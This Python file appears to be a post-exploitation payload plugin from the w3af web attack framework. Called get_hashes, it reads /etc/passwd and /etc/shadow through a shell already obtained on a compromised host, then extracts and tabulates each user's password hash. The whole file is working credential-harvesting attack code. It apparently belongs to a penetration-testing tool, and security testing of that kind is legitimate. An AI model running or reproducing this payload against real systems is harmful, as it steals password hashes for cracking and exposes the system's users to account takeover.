from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class get_hashes(Payload):
    """
    Get the hashes from the /etc/shadow and /etc/passwd files (if any).
    """
    def api_read(self):
        result = {}

        passwd = self.shell.read('/etc/passwd')
        shadow = self.shell.read('/etc/shadow')

        def get_hash_list(input_file):
            result = []
            for line in input_file.split('\n'):
                try:
                    user = line.split(':')[0]
                    uhash = line.split(':')[1]
                except:
                    pass
                else:
                    if len(uhash) != 1:
                        result.append((user, uhash))
            return result

        result_pairs = []
        result_pairs.extend(get_hash_list(passwd))
        result_pairs.extend(get_hash_list(shadow))

        for user, uhash in result_pairs:
            result[user] = uhash

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'No hashes were found.'
        else:
            rows = []
            rows.append(['User', 'Hash'])
            rows.append([])
            for user, uhash in api_result.items():
                rows.append([user, uhash])

            result_table = table(rows)
            result_table.draw(80)
            return rows
